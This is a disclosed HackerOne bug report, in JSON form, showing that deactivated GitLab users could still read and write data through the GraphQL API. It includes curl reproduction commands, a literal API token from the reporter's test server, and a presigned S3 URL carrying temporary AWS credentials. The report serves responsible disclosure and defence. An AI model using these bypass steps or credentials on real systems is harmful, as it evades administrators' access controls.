{
  "id": 1192460,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTkyNDYw",
  "url": "https://hackerone.com/reports/1192460",
  "title": "A deactivated user can access data through GraphQL",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2021-05-11T19:38:13.216Z",
  "submitted_at": "2021-05-11T19:38:13.496Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "joaxcar",
    "url": "/joaxcar",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/9865qc9er7t2lratx5rgszbf3257/c8a1698ff707a5e3e8a91a3484838363845daac68cb82c86d55c9e2d44d67b67?response-content-disposition=inline%3B%20filename%3D%224FB38693-148C-4D50-BBCD-D726D3AE2B4F.jpeg%22%3B%20filename%2A%3DUTF-8%27%274FB38693-148C-4D50-BBCD-D726D3AE2B4F.jpeg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7G4OCRFL%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T014736Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEH8aCXVzLXdlc3QtMiJGMEQCIDGN6xRXkipIqeD39%2FtstUVrQkeHhl%2FxhvDuWUHEJgsgAiBcJw8vwBpE3IzuTr3fqr2M9V6SwVQHEIisgKuKMJVoWyq7BQj4%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMfc22FeItlB7fsFn%2FKo8Ffm5Vqp0OLe5pV1PeqgQWzDTuU4FqowWH1fjAMotLjDQx0AvmjSuLkx8nHIR3F9EcWNhI1buvDphOuSY3oD4T4WVLQjTUCaMjN3e%2Fv741055XG5OPXCe1oEb8eWqfcx%2Ff5jVOG7FoFGMQs25WHeUIB3rpzR%2FVVQuoRKv5KLz6lGI8wn3uquTw05jVNXa7qngHd%2FJH1eY4P9%2BGoYYpVfQmWzjROMHwa2x0sJk5QfPMqXyamTGOs5V0NSbkOtc0pXBibCpzjFV4I2WWEhj5EnzdWD8s%2FAO5UvaoYzZQ2brwSrINS9bNyuQFAwWfH0KDjjtYzt9ye0p%2FNKTecEh20UFVidMGzwuwRHWc9Cq5ycYqCUZIFmA9GbQvBknj3PSBdPZFRotUt4j8i0rMlsoAie28maE%2FXLI6q2%2BrACzFa%2B3HqG38IS95u7kjj%2BQfZA0pjGNrh3gpJQHn9GdTbc4vN4GVOZPSqV%2FFkq7ghOZQ4fzCYQRfWs9ELAyAidng9JhSn2dNMoI05u%2FM%2BbP0h3qqILA2%2Fh2gt9DdzecwEXUHoIa7f9d0jG%2BDm2aCOYZ9Hle3Faq12GA%2FG26%2BCKb9KFyODx40P%2Fz5R2pYw5v0KgRaP%2BUYb7x4dok%2B38i7vFKWjfXmYVh2p9BYr0eXnfuIkhfQSy8FLuc%2BcqsQqKEGmEuVSO0SErDAOTV2RRodc3hu1ovCoNpjY8TLQqphyfm2c1vyeXEdqCmkSX55Ia9wT3XppjXji276gS3D5RBQuScemfR5keTR5u6B5Z2T%2F3Wf066KyQOBwe9YC2RDTypy%2F12MDBpO3ubGJBYMa%2FxURNt82yFwt4cfofeiJLAfNZXk%2BfkWYPevp40d%2B0snkPba1D8FtCQwyTDD47zGBjqyAfxTAeYaM3mZJ9o9BCgJhn0d8fXS%2FO6ZTTxqrwSftYi8Jrf11R2oMKWnlWzzVoJCsIkeWYs0cxytRs7N6KE1FSSB1Y5MkbxC98vs%2BQeNI3eYXBXj0%2BUpkJLE8Q74gL1lWJo%2B5D4p7WJlG3g%2BBA%2BLW9UFTQ44c2Js2TFR9b0AJGhj5mVyEt5u%2BT%2FsuRpGhrcAkcNiKLEx7K5l36DsSOHZ4JSggc43FWLv76erQxZm%2FIqyKvo%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5c7f7f851abb293536db46eaf26cc1ce551b22f1aa73cc9e4b58c2c4abf28e9e"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 264,
    "url": "https://hackerone.com/gitlab",
    "handle": "gitlab",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "GitLab",
      "twitter_handle": "gitlab",
      "website": "https://about.gitlab.com",
      "about": "A single application for the entire software development lifecycle."
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2021-08-30T13:25:12.844Z",
  "bug_reporter_agreed_on_going_public_at": "2021-08-16T11:01:40.244Z",
  "team_member_agreed_on_going_public_at": "2021-08-30T13:25:12.681Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "### Summary\n\nA deactivated user should not be able to access information through the API. This rule is not enforced when making requests through the GraphQL endpoint. \n\nWhen reading through the changelog for 13.11.2 i noticed that the rule for a deactivated user allows for :log_in (as it should) but it is restricted from :access_api(as it should) [link](https://gitlab.com/gitlab-org/gitlab/-/blob/e568b72493328ad271ddb38f0b22109bc91d8447/app/policies/global_policy.rb#L64). The GraphQL endpoint does not seam to use this rules when authorizing a user. I guess GraphQL only checks for api scope on the user.\n\nThis opens for three potential problems:\n\n* A user using its account through the GraphQL API (through some script or similar) would not get a warning that the account is deactivated. This could lead to the account being removed if the entities controlling the GitLab instance has any automatic procedures deleting accounts. When reading about the deactivation feature I got the impression that most admins requesting the feature would use it in automated \"cleanings\" of their user base. I could see how an admin could implement a \"deactivate after 90 days inactivity\" and \"delete after 180 days inactivity\" rule or similar. This could lead to an account being \"in use\" through GraphQL could get deleted without proper warnings.\n* An admin could use deactivated accounts as \"bots\" or \"service accounts\" bypassing the billing of these accounts. (an admin can create users and deactivate them directly, before ever using the account)\n* The fact that the account should not be able to do this. An admin reading the docs are under the assumption that a deactivated account is blocked from using the API. An inactive user could have left some form of scripts running that would keep on using resources on the GitLab instance, which I guess the admin would like to remediate by deactivating the account.\n\n__as of 13.10.4:__ A deactivated user can (without activating its account) use read queries on the GraphQL endpoint. The latest security patch removes the ability to use mutations due to the fact that \n ```\n   rule { deactivated }.policy do\n    prevent :access_git\n    prevent :access_api\n    prevent :receive_notifications\n    prevent :use_slash_commands\n  end\n```\nprevents :access_api, and\n```\nrule { ~can?(:access_api) }.prevent :execute_graphql_mutation\n```\nprevents from using mutations if I understand the code correctly.\n\n__tested on 13.11.1:__  (Prior to latest security patch 13.11.2) A deactivated user can (without activating its account) use queries and mutations on the GraphQL endpoint.\n\n### Steps to reproduce\n\n__Unlimited service accounts__\n1. Login as admin\n2. Create a user\n3. Deactivate the user\n4. Create an api token for the deactivated user\n5. Use the token in GraphQL requests such as (replacing url and token)\n```\ncurl 'https://gitlab.com/api/graphql' -H 'Accept: application/json' -H 'Content-Type: application/json' -H 'Authorization: Bearer <<TOKEN>>' --data '{\"query\":\"{\\n  currentUser{id}\\n}\"}'d\n```\n\n__User with deactivated account__\n1. Use any old token from your deactivated account in requests such as\n```\ncurl 'https://gitlab.com/api/graphql' -H 'Accept: application/json' -H 'Content-Type: application/json' -H 'Authorization: Bearer <<TOKEN>>' --data '{\"query\":\"{\\n  currentUser{id}\\n}\"}'d\n```\n\n__or on servers prior to 13.11.2 (tested on 13.11.1)__\n1. Login as admin\n2. Create a user\n3. Deactivate the user\n4. Create an api token for the deactivated user\n5. Add the user to a project with (use admin token, and a real project id)\n```\ncurl --header \"Authorization: Bearer <<ADMIN TOKEN>>\" \"https://gitlab.domain.com/api/v4/projects//members\" --data \"user_id=2&access_level=40\"\n```\n6. Then perform a mutation with the disabled account:\n```\ncurl 'https://gitlab.domain.com/api/graphql' -H 'Content-Type: application/json' -H 'Accept: application/json' -H 'Authorization: Bearer <<DEACTIVATEDTOKEN>>' --data '{\"query\":\"mutation {\\n  labelCreate(input:{title:\\\"deactivated\\\", projectPath:\\\"test1/test1\\\"}){\\n    errors\\n    label{\\n      id\\n    }\\n  }\\n}\"}'\n```\nto create a label in the project.\n\n### Impact\n\nFor GitLab it could lead to loss of revenue due to the ability to create accounts that are not billabel but \"usable\". At the moment the GraphQL API is a bit limited but will probably grow in scope.\n\nFor users. Running the risk of missing warnings about disabled accounts. Could lead to deletion of account if admins does not notice that the account is being used.\n\n### Examples\n\nI would guess that this is affecting GitLab.com but can not create a disabled account there.\n\n### What is the current *bug* behavior?\n\nWith a token from a disabled account the REST API gives:\n```\ncurl --header \"Authorization: Bearer jKSvxhuDN-Noag6N-w7R\" \"http://gitlab.joaxcar.com/api/v4/user\"\n\n{\"message\":\"403 Forbidden - Your account has been deactivated by your administrator. Please log back in from a web browser to reactivate your account at http://gitlab.joaxcar.com\"}\n```\nwith GraphQL\n```\ncurl 'http://gitlab.joaxcar.com/api/graphql' -H 'Accept: application/json' -H 'Content-Type: application/json' -H 'Authorization: Bearer jKSvxhuDN-Noag6N-w7R' --data '{\"query\":\"{\\n  currentUser{id}\\n}\"}'\n\n{\"data\":{\"currentUser\":{\"id\":\"gid://gitlab/User/15\"}}}\n```\n\n### What is the expected *correct* behavior?\n\nGraphQL should give a warning as the REST API and block disabled users from accessing data.\n\n\n#### Results of GitLab environment info\n\n```\nSystem information\nSystem:\t\t\nCurrent User:\tgitlab\nUsing RVM:\tno\nRuby Version:\t3.0.1p64\nGem Version:\t/usr/lib/ruby/2.7.0/bundler/spec_set.rb:86:in `block in materialize': Could not find rake-13.0.3 in any of the sources (Bundler::GemNotFound)\n\tfrom /usr/lib/ruby/2.7.0/bundler/spec_set.rb:80:in `map!'\n\tfrom /usr/lib/ruby/2.7.0/bundler/spec_set.rb:80:in `materialize'\n\tfrom /usr/lib/ruby/2.7.0/bundler/definition.rb:170:in `specs'\n\tfrom /usr/lib/ruby/2.7.0/bundler/definition.rb:237:in `specs_for'\n\tfrom /usr/lib/ruby/2.7.0/bundler/definition.rb:226:in `requested_specs'\n\tfrom /usr/lib/ruby/2.7.0/bundler/runtime.rb:101:in `block in definition_method'\n\tfrom /usr/lib/ruby/2.7.0/bundler/runtime.rb:20:in `setup'\n\tfrom /usr/lib/ruby/2.7.0/bundler.rb:149:in `setup'\n\tfrom /usr/lib/ruby/2.7.0/bundler/setup.rb:20:in `block in <top (required)>'\n\tfrom /usr/lib/ruby/2.7.0/bundler/ui/shell.rb:136:in `with_level'\n\tfrom /usr/lib/ruby/2.7.0/bundler/ui/shell.rb:88:in `silence'\n\tfrom /usr/lib/ruby/2.7.0/bundler/setup.rb:20:in `<top (required)>'\n\tfrom <internal:/usr/lib/ruby/3.0.0/rubygems/core_ext/kernel_require.rb>:85:in `require'\n\tfrom <internal:/usr/lib/ruby/3.0.0/rubygems/core_ext/kernel_require.rb>:85:in `require'\nBundler Version:unknown\nRake Version:\t13.0.3\nRedis Version:\t6.2.3\nGit Version:\t2.31.1\nSidekiq Version:5.2.9\nGo Version:\tgo1.16.4 linux/amd64\n\nGitLab information\nVersion:\t13.10.4\nRevision:\te11cc45d59e\nDirectory:\t/usr/share/webapps/gitlab\nDB Adapter:\tPostgreSQL\nDB Version:\t13.2\nURL:\t\thttp://gitlab.joaxcar.com\nHTTP Clone URL:\thttp://gitlab.joaxcar.com/some-group/some-project.git\nSSH Clone URL:\tgitlab@gitlab.joaxcar.com:some-group/some-project.git\nUsing LDAP:\tno\nUsing Omniauth:\tyes\nOmniauth Providers: \n\nGitLab Shell\nVersion:\t13.17.0\nRepository storage paths:\n- default: \t/var/lib/gitlab/repositories\nGitLab Shell path:\t\t/usr/share/webapps/gitlab-shell\nGit:\t\t/usr/bin/git\n```\n\n## Impact\n\nA user with a disabled account can access the GraphQL API without activating the account. Running the risk of missing warnings about disabled accounts. Could lead to deletion of account if admins does not notice that the account is being used. Or accessing data without admins knowing the account is in use.\n\nAn admin could create accounts that are not billable but \"usable\". By creating disables accounts and use them through GraphQL.\n\nI put it at medium due to the risk of data loss if not getting proper warnings and the fact that it has access to the API even if explicitly told that it should not in the documentation.  But feel free to lower the severity if you disagree.",
  "bounty_amount": "1370.0",
  "formatted_bounty": "$1,370",
  "weakness": {
    "id": 26,
    "name": "Improper Access Control - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 45,
  "voters": [
    "loaymorad",
    "l0da",
    "n1m0",
    "alejandroar",
    "mattberg",
    "shreyaschavhan",
    "ali",
    "run_win",
    "xsky",
    "akashhamal0x01",
    "and 35 more..."
  ],
  "severity": {
    "rating": "medium",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 39022,
    "asset_type": "OTHER",
    "asset_identifier": "Your Own GitLab Instance",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
